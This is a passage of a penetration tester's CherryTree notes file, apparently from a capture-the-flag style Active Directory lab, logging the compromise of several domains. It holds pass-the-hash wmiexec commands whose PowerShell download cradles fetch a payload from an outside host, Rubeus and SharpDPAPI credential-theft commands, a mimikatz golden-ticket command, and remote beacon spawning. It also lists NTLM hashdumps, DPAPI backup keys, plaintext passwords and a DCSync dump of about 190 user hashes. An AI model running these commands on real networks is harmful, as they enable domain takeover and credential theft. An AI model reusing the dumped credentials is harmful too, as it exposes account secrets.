+C+yjkuZc9qyprjSTZ44LMq6C+ISMsARQ4D4Q7OZhf67TzCqzfsiQBGFBEBmYAccwpySIXPNJAoBni8wY
+jvIfW7aF9KJLyFTaS2D8zCyKjekpuL+xM4DK5NQaDmAn7qCPIst9jp/SyAATbYmBOZIDp7lmHEYjqyrI
+etvBJbMgxGVdfAy44Y6mCRURk0nXBkInKoHHnDbADWttBApmYtGMi4uhiBRThxg2TQF2hwkTFwPWXNx0
+ujwpG6SgR9MWvMAgBnEEhCJCBx1PVcV6ch+Z4VZ9d8SpUDqeV096XCIPqXl8VquE7OYRFWamRtG7mlEa
+</rich_text>V9fr3srrbBvf7rLeUXaQtE4XD/nNl/Gu243KRdaZs6WWUvK3nJs06+1altFneHw=
+				</node>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="DEV.ADMIN.OFFSHORE.COM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569934955.33" ts_lastsave="1571783317.36" unique_id="17">
+			<rich_text>Domain Name: dev.admin.offshore.com
+DC02    172.16.2.6
+WS03    172.16.2.102
+
+
+Account from Corp with Dev in the name
+3609	svc_devops	c718f548c75062ada93250db208d3178
+3608	DEV$	15c85cce3818654479df3d4f5ca6a3d6</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="WS03" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571426931.12" ts_lastsave="1571754257.79" unique_id="36">
+				<rich_text>Name:    ws03.dev.admin.offshore.com
+Address:  172.16.2.102
+
+-   Configure socks proxy on DC01 beacon
+   → socks 9050
+
+-   Use corp\svc_devops accout to access WS03
+   → proxychains python /usr/share/doc/python-impacket/examples/wmiexec.py -hashes 0:c718f548c75062ada93250db208d3178 svc_devops@172.16.2.102 &quot;powershell iex (new-object net.webclient).downloadstring('</rich_text>
+				<rich_text link="webs http://10.10.14.6/update')&quot;">http://10.10.14.6/update')&quot;</rich_text>
+				<rich_text>
+      ⇒ *** Crackmapexec did not work; had to use wmiexec
+
+-   Interesting files in C:\Projects\goMonitor
+
+    # goMonitor
+        goMonitor is a powerful cross platform monitoring application that runs over HTTP.
+    # Agent
+        The Agent listens on HTTP and will execute anything the server sends to it.  It expects /exec/{Command Here}
+    # Server (Not Started Yet)
+        A website where administrators can create custom scripts and designate which agents to run them against.        
+
+
+# Kerberos ticker for svc_devops
+execute-assembly /opt/tools/CSharp_Tools/Rubeus.exe asktgt /user:svc_devops /enctype:AES256 /aes256:3ace9883cba53f049bffa804f0c39f1c02fe6863f374d2f409d64a239470f0cd /domain:corp.local /dc:dc01 /ptt
+
+- Having issues running Bloodhound
+
+-   Found password in DPAPI
+   → Got Corp.local backup keys from DC01
+      ⇒ execute-assembly /opt/tools/CSharp_Tools/SharpDPAPI.exe backupkey /server:dc01.corp.local /file:corp_key.pvk
+      ⇒ Downloaded corp_key.pvk
+      ⇒ Uploaded corp_key.pvk to WS03
+      ⇒ execute-assembly /opt/tools/CSharp_Tools/SharpDPAPI.exe credentials /pvk:corp_key.pvk
+
+            Folder       : C:\Users\cyberops_svc\AppData\Roaming\Microsoft\Credentials\
+                CredFile           : C03C7336696A6EDA494DD438A669FC76
+                guidMasterKey    : {53bcec60-ed8d-474e-ae70-4eff5840d216}
+                size             : 374
+                flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+                algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+                description      : Enterprise Credential Data
+                LastWritten      : 5/15/2018 12:41:20 AM
+                TargetName       : Domain:target=CORP
+                TargetAlias      : 
+                Comment          : 
+                </rich_text>
+				<rich_text weight="heavy">UserName         : vincent.delpy
+             Credential       : Il0v3kiwis!</rich_text>
+				<rich_text>
+             
+-   Had issues running bloodhound. I had to execute as System from WS03
+   → execute-assembly /opt/tools/CSharp_Tools/Sharphound/SharpHound.exe -c All,Loggedon -d dev.admin.offshore.com --RandomFileNames
+
+
+
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="DC02" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571426732.48" ts_lastsave="1571836717.03" unique_id="35">
+				<rich_text>Name: DC02.Dev.Admin.Offshore.com
+IP: 172.16.2.6
+
+-   Net accounts show the minimum password length of 0 which indicates there could be blank passwords used   
+-   Joe is a domain admin with a blank password. Used wmiexec with the blank password NTLM hash to execute commands.
+
+
+-   proxychains python /usr/share/doc/python-impacket/examples/wmiexec.py -hashes 0:31d6cfe0d16ae931b73c59d7e0c089c0 joe@172.16.2.6 &quot;powershell iex (new-object net.webclient).downloadstring('</rich_text>
+				<rich_text link="webs http://10.10.14.6/update')&quot;">http://10.10.14.6/update')&quot;</rich_text>
+				<rich_text>
+
+
+-   Got access to DC03.ADMIN.OFFSHORE.COM using the SID history exploit.
+   → mimikatz kerberos::golden /admin:jason /domain:dev.admin.offshore.com /sid:S-1-5-21-1416445593-394318334-2645530166 /sids:S-1-5-21-1216317506-3509444512-4230741538-519 /krbtgt:9404def404bc198fd9830a3483869e78 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+
+        * S-1-5-21-1416445593-394318334-2645530166 (SID of dev.admin.offshore.com)
+        * S-1-5-21-1216317506-3509444512-4230741538 (SID of admin.offshore.com)
+        
+        
+ -  Able to spawn SMB Beacon to DC03
+   → psexec_psh dc03.admin.offshore.com smb
+
+
+Hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:96fa9583c89ae9713ddeffb6f5f345eb:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9404def404bc198fd9830a3483869e78:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+IIS_dev:1105:aad3b435b51404eeaad3b435b51404ee:ce18f9730484ed029749730e2f82b147:::
+joe:1604:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC02$:1000:aad3b435b51404eeaad3b435b51404ee:9d284e5948741cc0dcf5691f71fe02ce:::
+WS03$:1104:aad3b435b51404eeaad3b435b51404ee:ff96e2b9ac862b196ce3e78c1f9adaa5:::
+ADMIN$:1103:aad3b435b51404eeaad3b435b51404ee:5f19127bf15d3fce7865b2969a5cf25f:::
+CORP$:1109:aad3b435b51404eeaad3b435b51404ee:8cde9f0c7138d60ddb66b4939ea51a3b:::</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="DNS Recon" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571755113.2" ts_lastsave="1571755113.2" unique_id="39">
+					<rich_text></rich_text>
+				</node>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="DPAPI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571765936.06" ts_lastsave="1571766206.67" unique_id="38">
+					<rich_text>DPAPI Backupkey
+
+HvG1sAAAAAABAAAAAAAAAAAAAACUBAAABwIAAACkAABSU0EyAAgAAAEAAQB3REw14y7XiZn1lUQ1mLqh
+brzA+ZAB0SX0MnQnLjFZV0FXDUtNMsM5ZpRGCusOvyFZVDQPikxfSYy9TxzLPr44eXDN51KQbgpM5F0m
+hqNujTWm7LvhKFn1kQPApV530f8nzJIwZ71/ocAVRkzhmz5q1kZa6F9+KznOvRxCqQMYtvgnnyjKolCo
+5i8KQ65k2SdnJLo1vVV5EHxlmsOd4me7S4wBecNsPXtC1TfPaIf6xgcdQ20cRUn8/C5xsh62hFxHN/FE
+Bxmapl3xMHXHOUOlZB1LxqDf1yN55a5fdnmeOYMQC7WVMwxXNmnUiIiWOSbSISRJcKAZjrj4kaYHHoTL
+UayoB/1pGE0W5Ibt7fHfwsRgRrm1qC+g9yfhsYWVvGiRVjufocBUEoiNiOWNIZyqX7pH5PJCfWmRJ0i3
+GNqSNy1dHaf+WWwONxXU9gAgNc1YiLvcT0d5EzUtHIGwiZa6utcBTM3n/Q0v3UPj4h/aEJ7Y8DQYyybo
+hF+4GsGbMP1HWvAtySVodsH8jiMBjVQXiHcI7OKl2O5isjsn2aldR69mLi+4Y6LZGzsb/Wo+FSzp5vDP
+I1bOhFwrOzWfbs0r2+l09qcdM4/htH7Cx+0IvZcwd0zoCZ5dQOGmSxU9YqP12RTdxplG8I+z5LBJx92n
+TI1yR76HpZBqNKHOv17GzdEzUEaPrxx9GrubAsMSySk+nn8bVpkTZQHFJMgMZ6+Ty+KoaUF0B4kCyDaE
+WPHmWrrTPy8qzvBKJZW9YCjPrslzsmRA83MMJe862YjdXRNsuVlOHB0eHWC9v2OIvfHBaZ/pJv4O2EPW
+lqAFLQOD8qcMscdILwcI3MFqHI4/C9XLz6whHcc+v4x/gxBH2uUv7tW/xX4n1hNN7hv7jvj7nWeEkcwH
+Eiz4BGJC2EWWRvJmi552dNhLS+mK6XRrq+xOYRCMzexcWobFSK4OKIWPkW6AUPwNyeAOEtNqftZ6m5aG
+FXj42aCYoUjXWjAp2H/LyvDWCUsHqgq2aVcbAOPbr3OyNYFT/9O155bT7ACv5Umj2safJ563Bv5uUXrB
+PTx+qKeEpN/SJW/9js/g2kYVwJrbY80lA5McnaQiSbaBXNCFaf3daMTxUfnmOTRzVF74rdjzPnQmzpOf
+3syygIWWrTL1AclX0hXGBtyvoMIxumi/9lkba+En5jZ4Xg58M2eildF17LqI43E7YWK9chXBOfHhEIcI
+6z1eXZuI88Qlgls80vn/39DvGuZ4a2YwWIkwXOXhXMFt9EqoLKwF/qdWG4VTuSbtURVGSPekY+hjX85b
+Sb3/NlCw/Tt0nNcPwPYvmDaMEim3brA49/TX3+g+YJ8Aoa5tN9m8BH23nW5qHLRU4nXHMSrhJuNiK0pH
+Sis4HtgyOGg/9WlBAg8AhjomJzgh2D+fm5NeAO47LitPMRZ8lHrhA0fIgHohhIKQfgkb3hbK2POThK3+
+RBgCT4mtSGp83FadEHLqqPHbapVsKTUvdV8XWCCFr8sraw+6/upeWmy8d+VSebMyHmlRls6T8CU=
+</rich_text>
+				</node>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="ADMIN.OFFSHORE.COM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569934975.24" ts_lastsave="1571783379.61" unique_id="18">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="DC03" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571783379.61" ts_lastsave="1571920229.85" unique_id="43">
+				<rich_text>IP: 172.16.3.5
+Hostname: dc03.admin.offshore.com
+
+- Beacon spawned from DC02 to DC03
+
+- Spawned Beacon from to WS04 using the Administrator account
+   → execute-assembly /opt/tools/CSharp_Tools/Rubeus.exe asktgt /user:Administrator /enctype:AES256 /aes256:b94c517e4db5971ac924bf79ca7b20cd3db49a8bd734194cb15d6786316d00e1 /domain:admin.offshore.com /dc:dc03 /ptt
+   → wmi ws04 smb
+
+
+
+
+
+Hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:19a58d8b53e0874a108df36c750efe6f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ea9112d4beb759907688c9e267eff246:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+bankvault:3113:aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1:::
+DC03$:1000:aad3b435b51404eeaad3b435b51404ee:a309490aabcffeea561fb1d8b36607d0:::
+MS01$:1107:aad3b435b51404eeaad3b435b51404ee:db505645b78f70ae01dd6cebbe4b2b8b:::
+WS04$:1108:aad3b435b51404eeaad3b435b51404ee:2abf50d13b5e08b92ac2d90c1d125b99:::
+DEV$:3101:aad3b435b51404eeaad3b435b51404ee:c28826164b6a29ec5ac985eef42f72af:::
+CLIENT$:3104:aad3b435b51404eeaad3b435b51404ee:bf13131304ce5144a76f22bc8c53b853:::</rich_text>
+				<node custom_icon_id="0" foreground="" is_bold="False" name="DPAPI" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571838706.27" ts_lastsave="1571838707.57" unique_id="44">
+					<rich_text>
+
+
+BACKUP KEY
+
+HvG1sAAAAAABAAAAAAAAAAAAAACUBAAABwIAAACkAABSU0EyAAgAAAEAAQA3FNEmpVHGyNoacWNW6TI2
++y6nO67dxSiydgwAmAMRou2spRXINilWtMdfZ7oXvZ8hPHbaFldaHvW+trmBlS5OByqXjlpmiVlSVmq7
+l3SAGPNVKsQ1jIZYQ1nskJc9eGYkBGBI1RTopgXubfSP5+rW9p6zzdr5tiVgKspSXgqgNVKgmhnpNwZo
+J8ZQXxp49sAshucT6D5MTjkVJxMwmeDwnK08HVP5Hbh1/jxJ7BEOAnSoC6E8cRdRucwkBeN+dMeQmhmV
+LpThdR1YNc4n94kBtQO2jcXwc91D5B6cXmdOVovOU/4WW9FObEU2aR7KrC8u32MCk2DW9CxJr2U7Afja
+u/VMWPFPDrGaQLwPLi5SD0k7NLapHd2929jKvEoTJdeYKdGm2CfQqDZnFDjKCvdhn1B2b6TZ0Utlk50e
+bCcpP6HW8L0L22Vt7d7ruo+s5RdfbBZSLIwrKBFTr6vP99v/x27CsVy1po6EJJ8dqlXwXJ/ehXrbLPJd
+4iZ6LzaLAu+1FU0NuZxekN8S1Hf/UkEPPJrc66MQ9TstciVCOGTEFKtFbj7FoJQ4AqP7NMfjLEmE0hQR
+UZ3Az6qnLnrcy8G6c60jSCtmQK+HnHe6BNSGbu8oZ/x5WmMPcJ3GvuRA7bqvVenqYX75RBugpaMUY2ZR
+692C5wDXSYtiQcwGecGI6pHKga5W+OP1+jZxRB3y1U3MM1kX+45Uqoy6blMHhLtcUThl3fwzKr5KQF3H
+sF5Z+lAhzkMlxut9QXJOpH/e6ByuMaKq0eWyIXVpKgkPqIg3JIQz/D3FLqEuzefW6z23tWb3FytBdI/D
+3B69ilA9Ij3IiR2GIb+RYAT3SQ6DHdnh2dY0ipbXXvxix4wXGy7dYD7qr5a1mZwN36Te23pJpK0kHhXy
+HYE6Al9QCBiYLTAxJlyLjjyRKDSNMGtTXE4Tt/j4xKPxgNrnGn/IbKnDOcqDGSfxhQkTmAGnVUWMizu2
+QnqCmNr1Vz1rA/YeLpoxFgV0RZ67RPhYQ7twnIhR8OMEh62xPlMfMl+qdxNQUD+PZ4AXtIJhoFInVlFb
+NcxALbGLI46nwA6a9yzzpkyMk/cFFBygBTfH5AbKw1Cpjjl/Bc4oI7CR9OB91ZLklZAJC9V74xymnmEN
+Fkjm2uyQVtkz9TKKLqf0TRTDBcnmgu6lYqMDVxAr980LfuPUrB0yqzW3QRiSX+ihzhDDKfT8rBUjDpwD
+RzN4vMe/x273gZQU8uURCdwfuHwNzpnz5v0idmxrE1OArWaKZB4z6NKGlA5k30FwF8qx0NH2vbgqUQqc
+kNFO/MqChiN+9ZV3Ntci84njcfPTXVWXLe3ELanuWRv27mUxySFKfYP50GrB3Fqby7ZIpWNvomOSWhTu
+oj3W9Um1k2EgmhUR3rUOkJeKCmyhB3gb1sOUkNQ2CLtWkqdknxcL/+8VM1WHSOGkmupZ+G/260OfPuEO
+</rich_text>/yzhHVR/NHdJK+fo1oMtIFZaH7NzG/kQwY1w6+EKTQtoP97tdAITGzjj8x0GEQI=
+				</node>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="WS04" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571783367.72" ts_lastsave="1571920305.59" unique_id="42">
+				<rich_text>IP: 172.16.3.103
+HOSTNAME: ws04.admin.offshore.com
+
+-   Beacon from DC03 using the Administrator account
+   →   execute-assembly /opt/tools/CSharp_Tools/Rubeus.exe asktgt /user:Administrator /enctype:AES256 /aes256:b94c517e4db5971ac924bf79ca7b20cd3db49a8bd734194cb15d6786316d00e1 /domain:admin.offshore.com /dc:dc03 /ptt
+   →   wmi ws04 smb
+
+
+-   ADMINISTRATOR@CLIENT.OFFSHORE.COM is part of the Administrators@ADMIN.OFFSHORE.COM Security Group
+-   Seatbelt shows a SID in the Local Administrators Group: S-1-5-21-3620216948-299008490-4232453229-1604
+-   Possible GPP Passwords
+
+</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="CLIENT.OFFSHORE.COM" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571838960.59" ts_lastsave="1571921941.42" unique_id="45">
+			<rich_text></rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="DC04" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571848038.32" ts_lastsave="1571848041.18" unique_id="46">
+				<rich_text>hostname: dc04.client.offshore.com
+IP: 172.16.4.5</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="MS02" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571921941.42" ts_lastsave="1571921956.12" unique_id="47">
+				<rich_text>Hostname: MS02.CLIENT.OFFSHORE.COM
+IP: 172.16.4.31</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="CREDENTIALS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1570705950.43" ts_lastsave="1571835598.14" unique_id="28">
+			<rich_text>## CORP DOMAIN ##
+
+Email ned.flanders@offshore Pass: Lefty1974!
+ned.flanders_adm : Lefthandedyeah!
+svc_opmanager : Manage my engine 123!
+wsadmin : 669b12a3bac275251170afbe2c5de8c2
+iamtheadministrator : d4c6b87b180ed25d6ac8821fe449f247
+svc_iis : Vintage!
+pgibbons : I l0ve going Fishing!
+ned_adm : Nothing to see here! (Acct Disabled)
+vincent.delpy : Il0v3kiwis!
+svc_devops : Pass123!
+
+## DEV DOMAIN ##
+joe : 31d6cfe0d16ae931b73c59d7e0c089c0
+
+vincent.delpy : Il0v3kiwis!
+
+</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="DCSync - Corp.Local" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571354436.91" ts_lastsave="1571354438.48" unique_id="29">
+				<rich_text>1604	GStephenson	a6c9bca7e1f4076c538ff6e7096d59be
+1605	AMountgarrett	4b76b38df5e9adf9739c8f43869d91ce
+1606	JHann	1d863479e1ab3bd62a2bfafa1abaa2dd
+1607	LBellantoni	2c019748d27c982f3be03c378759a954
+1608	LGresham	520d2dcba9759412cda4eeeb524e5407
+1609	EReynolds	bb413fd4eab36d867ae30ca134911ef6
+1610	MTorres	a1e69cd82485430ad9f732a7673b0732
+1611	OCollier	9e5c6bcd86c00d97c22f8630be9e4f35
+1612	KSteele	4192316432ae3c0b0e9c948d494e64fa
+1613	LMacghey	35fb7b7d541ed4fee611fbefe89707c6
+1614	FFigueroa	d365fa7447d7cf17e62ba4758b67632e
+1615	RFord	ece851cce21d0092e2d1e61537dd351e
+1616	LPotter	6ded62367988f54d2d562621d6532051
+1617	SYoung	64f12cddaa88057e06a81b54e73b949b
+1618	BMoore	65d8f7784ce4eed6b2c1a028c4e54866
+1619	ZWootten	561d7ee942fadd19101ccdb0a5fde05a
+1620	SBradshaw	c377ac42a9918b3ccda3f1585484665a
+1621	DDavis	027dcae638b664716cdc075fa4cbc493
+1622	EMoulds	916c1dbf6a2a698bfbb4104d3fe55974
+1623	AJackson	d5aeb975ac6af0e64c488f2216a877e7
+1624	MWhiddon	c5e393be1ff24f0fb5c823594bba7b18
+1625	AKidd	a00a20db1bac75f6837602c892b725fa
+1626	GKelly	4d5351f183915a1bebdb05adc108eda3
+1627	ABuchanan	4f0fbf6796fbad886a2567412842ea57
+1628	SHancock	64e2807587782a17bd4cbd524f27941d
+1629	LGraham	07ae9736b127651f78a2f0e7fa85c5a2
+1630	NWong	18d35edf54a8586accd66a9750f091d2
+1631	KHolmes	4b76b38df5e9adf9739c8f43869d91ce
+1632	EPenman	b7f92ec7a5f25ea04db44b88e9c77cdc
+1633	SCardiel	cc3077c360d91577d529243ee2e306c8
+1634	MLeach	573b24797078830a216fec947ea233a9
+1635	SConnell	759188716874b63c41a1fbc746b11f47
+1636	MArnold	cfc0f01a43aa5aca4d17cd1b4c96df5d
+1637	JHancock	fa2f9a7cdbcacef81d9281b24bd2fcce
+1638	LNorris	3deb3f3668e1371949ae72258ad6eed4
+1639	KDaniels	9b9bbb09be33802f9f637d5ce79fe0cb
+1640	LOwens	323c3e173e2661f8c4adeb8aa2f2a72d
+1641	HBooth	03893bc674bb6caf7f6bc92970e7ef21
+1642	CPearson	47b505a26891a5358c2638b0f621b31a
+1643	ABaxter	9ea8eb58b55e3abbb9d4eefae2b1f5c0
+1644	BMarshall	8b63b2668d9733db0d33026023a7549c
+1645	GCaley	9d9cddf89521ab955f454cc978d966a0
+1646	JByrne	ec0a6ca119e8e1007aba6fd2a38a3869
+1647	RKeighley	9798c9db0fd3b284b20ca0698b46c876
+1648	HHoward	c8a305437b69ca45fd7cb4cc9bab0617
+1649	TRowley	f20d9bc8e802ab800675436dd96c65e9
+1650	GLamb	64f12cddaa88057e06a81b54e73b949b
+1651	BHarricks	41060bff7593b66cfe48ed6ea374c9c9
+1652	ROh	8ce8da741acd34384fa9d75393c92ba3
+1653	KPollard	b6856939f91eee3ec24be4cda68436d4
+1654	PCarter	87ebfbf2ec0bc9a231bcebdc6255989c
+1655	COgden	be2cc297f1760ac88624e7accf283e26
+1656	MCarrodus	4b76b38df5e9adf9739c8f43869d91ce
+1657	MLawson	f1fe60b99d69336646a45fa198892d46
+1658	WLawson	bf71f3d4c3206abdc2aa1b68752f693c
+1659	LHerbert	66727a3768997eb77a12331a322d2e82
+1660	JBeor	4c2211d02122f240912c384642bcc4ba
+1661	JJones	d32b1cd6598c371dbed599e0d55f6174
+1662	ABowen	26be5a4f670ad0c061b098e453935af5
+1663	MMcCarthy	6c3c71b6d822886bfe439e2b98c381ce
+1664	VBuffington	e671583afcb2d9ad1d681912b24c08c5
+1665	SLin	79329c71fbfd86a03992cbb03160fe87
+1666	ESmart	8d8fe63f7562d5a891114786ffd03358
+1667	FSavage	ece851cce21d0092e2d1e61537dd351e
+1668	RScott	ed276ffd7da1af554b93d217cb65f36a
+1669	JLaw	84d94340a3c65421035d670595341fd6
+1670	LSingh	ddc032f980fe3c96f1c2f9d14ef05746
+1671	CHammon	f694d4f0bf77aa23a22d6a7d53064e80
+1672	EFry	44e635db44220d2a16384f9bad6a60bd
+1673	EWarren	1625baf0e4d9db7e4b0a24fb67b2ace9
+1674	AGould	9f5315e746fe5eb09219664b6a49fd50
+1675	WNeal	b54e813a4bc4cae66ee3dddb2e66ad46
+1676	MKnatchbull	1d863479e1ab3bd62a2bfafa1abaa2dd
+1677	AHamilton	e21d7bb4b95413f6b84ebda1dd247c0c
+1678	RSelleck	5afa338bc4f1e4293106213986c824d5
+1679	SToRot	c9d2146e50b099f7786ea3717a485d33
+1680	CCumming	f788d1fa13e341d6a07032627ae505f5
+1681	FMiddleton	00eb6ddeb5920cdd97cb280cedef7026
+1682	KMellor	01aacd1a08cfcead61f2ee181830c1d2
+1683	IJohn	84822e9c5312eea480c4c6ce5a493252
+1684	DThompson	2b0f89ee98a92adcfeb118ea21333718
+1685	LKoerstz	0d1954a1f2d8e13d8c74a327792e97b2
+1686	KReed	67ea7eaec614c4de8a22de3e98c43161
+1687	HBenevides	56326692b2ea040143a8710cf7695feb
+1688	MBrady	75bb6f72fb4794e306893a62dcbff707
+1689	KPearce	39be7b93a1f16e63f17f17aa66aa29e4
+1690	EGill	27cc9a81623cc008c065f8e64b75cdfd
+1691	LMarshall	43b8073a6c75e7ab8c29edb56bb1ab3b
+1692	MCartwright	a673f5b7f3729f9f4510c379ad744db6
+1693	BSampson	aa9c4d6dafc3a4b03cee581cbe670129
+1694	APike	ca6f9eae5f56fbf25ce86a43e9a77031
+1695	FSaville-Kent	8b63b2668d9733db0d33026023a7549c
+1696	KPowell	58341c26067e0cfd752fa6f119c8dec9
+1697	AKohler	95296e30a817888762462048aebcde36
+1698	KMartin	7f03c1fe94ab6e28a4809199ebfb1cbb
+1699	MHolmes	02e1987fd9b1d1acf7cb8b082795e996
+1700	LRussell	f7395b53a4726b562bc157e067ed93a3
+1701	MPackard	09091d70dd70726a1187df6e3bdf8f4f
+1702	DPatterson	0d37931b52b8ddf9c1d36d583345be9a
+1703	IBarry	93f5e37fe12876862309466efd17be11
+1704	JSwift	61e5454f120a2282b4c78bfe4634af49
+1705	GMitchell	2ccd272240b60a21ebda790208000304
+1706	ABailey	d81c814de010fbdc3fc84ee015cad44e
+1707	MWalker	8bab3ffefa95a133b0ae8dd9e651bc84
+1708	AJones	559e493314abd2eb6edcf6c48ae5c810
+1709	LSimon	6402b4ef6528c2426c9987e179b08d62
+1710	EBailey	e513a1133b17cba55361d44a952cfe6e
+1711	ECunningham	9cab9f872de824f8418587be8609de08
+1712	SHolden	1041830d4ec9d5bda91bb446a67edc3a
+1713	LMoreland	5f972cab25672e19d5f3fd7d5ed69200
+1714	JBennett	64f12cddaa88057e06a81b54e73b949b
+1715	JWade	4a150c7e689e86111ea3ee5b9181ddfd
+1716	WWinston	9ef97712b2c17c40644a9a1a10f1d728
+1717	LWestgarth	ece851cce21d0092e2d1e61537dd351e
+1718	FMills	76cb7a4755d0260f849b2c29d236f0de
+1719	COrman	bdb097d761970e3a4a88c8918ee10775
+1720	LHarper	75cdbf523fcac7a878834930fd965b13
+1721	TKirkpatrick	5546e054f13c8637683188269dd470bb
+1722	ADeLaRue	a6dd8f6d95eafdc060b1d23c1035a7dd
+1723	LPatterson	7e45b4a9730ef6f24571ae0c4ddd87e3
+1724	JStaton	1d863479e1ab3bd62a2bfafa1abaa2dd
+1725	MParsons	51492f4f5e17aeba063802ae0cb56ce9
+1726	LKnowles	b8bd4666275af2c0663efcafda89d347
+1727	SAckermann	eae73b6e767dccf4352ace4632827cf2
+1728	EHaynes	971d12216efae149d802d3be5f808eb2
+1729	AShuman	5750bf24160ace7be06511fdf59ec3aa
+1730	RChapman	c6704557b243346d18187ab0e6ca97c3
+1731	ADinah	4b76b38df5e9adf9739c8f43869d91ce
+1732	JJenkins	8e0d9314f006754acc12ad75a4ff69d0
+1733	JGoodwin	303ccfcdd9da88fd90d27e575fac52e3
+1734	JKing	e74a32303b66c5dd74420370d79ec1ae
+1735	EBrigden	0b6e2d264fb1ce0c94ca9817db9c36ab
+1736	SBroger	0e122898273eda6778fb2d063d8a22ea
+1737	RHussain	b9aad14098139a0f873e4bb6d4e58622
+1738	TLowry	5a2505b9b341ae318a225bf3ca114e53
+1739	SMilliner	466e64f74644b5140f4217ae603f5f67
+1740	LGibbons	be492166e246fef07474f6921cdc2a35
+1741	NMyers	24b1dea160393a3d9ee05fe9a2c757ed
+1742	MCampion	94c3b05113e3270e5360c9bde6c17513
+1743	LBracco	5bf38ec6c81869439594c07db1933bac
+1744	LToomey	c08cedf54ca8f1bf7978ab922a7b1261
+1745	AHarmon	d2c9fa9b2b5e3c6e038d0afdb5eefef7
+1746	ATraeger	3c160d2c42f1cf6b9612d6423079eec4
+1747	LNewton	bc97319df7222ebdeb1c25f276affa58
+1748	ACarr	8bcdd72766bccaf79f7fab4ff5843a68
+1749	DCrawley	f78e7c0ef3e325e6dad05dc3049e0fc7
+1750	MConti	04e49106e7c1fd68554d6a22d3af88b3
+1751	MWhitehead	79e54742e248c056b289a013cdff2d4a
+1752	SArellano	c9853c98df60eeec6a85dc860a697054
+1753	MMoore	e51ad577f101aeb070374349c100b851
+1754	LLevey	52d9bf75e9c0008032aa33466a0946a4
+1755	KBentley	143a9a30dd7d9d9bfac2fe6a8a1e106d
+1756	AGermany	abc794bf67d07fb15298c067bc4623ae
+1757	CFinch	9ac5ecd1ab4344f58f10f03489288d4a
+1758	DRussell	64f12cddaa88057e06a81b54e73b949b
+1759	BJones	0053d420feb1e8f528bd335871935bf7
+1760	DWarren	478727ee2d1b9885337917bd7aa27e78
+1761	ATrickett	d48dccd31a8b53cd5355ffa1d09e3542
+1762	JBarlow	aebc53a7caff7d0487f779c852383008
+1763	KWallace	be585716872874823f1d97d38aeaf1c0
+1764	MReynolds	445002739674101debc8eb33857b0746
+1765	MOrmond	67e70fd5083281dfb54b0854aeb25c15
+1766	JDay	5ffc1be50e8179244f47cfbe5bd1ae3b
+1767	MDaly	892a28f9f0e457c9e0293c46803f7b49
+1768	CHernandez	272b396c444e56e672d2424afac32141
+1769	LBroger	b1e091095aebf0f15bd0deab19227338
+1770	BSpeckman	76a424adfb96b9c7c02d32c9242a8bf7
+1771	DSilva	8721075c7348c15286efca1615ce9635
+1772	RGregg	e94d378a02d3443816ea7067445ed20d
+1773	RFisken	829bdc07102ec41d47a9b8172bda2654
+1774	CWaldrop	8d5b508097a9e4c12281b8e9ea25336e
+1775	JTrumble	8b63b2668d9733db0d33026023a7549c
+1776	GCoates	1d863479e1ab3bd62a2bfafa1abaa2dd
+1777	ABell	ccfcb280acd2794d6980de8a75956585
+1778	HBailey	878dad3f6cf16bd14770b18ba77226e1
+1779	EBarrett	58b584aa78f066a24abae00a6eae450e
+1780	CMacansh	e09d4ac63258ceb0da1c983e82372b80
+1781	SMain	117ce9cbc94ca938217c6483c5aad8ff
+1782	CHein	c87ea7365e0de6ac1edfe50da09695bb
+1783	ESullivan	3c62e864328d7251fa49bedfe9468b43
+1784	OMiah	2e63fbfec16712c362f119c7262f0bad
+1785	JDobie	184307fa9d75ae588e2f65ae1ea9f68b
+1786	IChamberlain	04bc7fcdd73d6b09f93bc2268571f731
+1787	EDoherty	f649e8168e2f5b5360ff94017770fbd1
+1788	FRowley	8925b6e1983dda5ff805e901fdd98533
+1789	JAdams	51726004de454c805db3fe86f617c58a
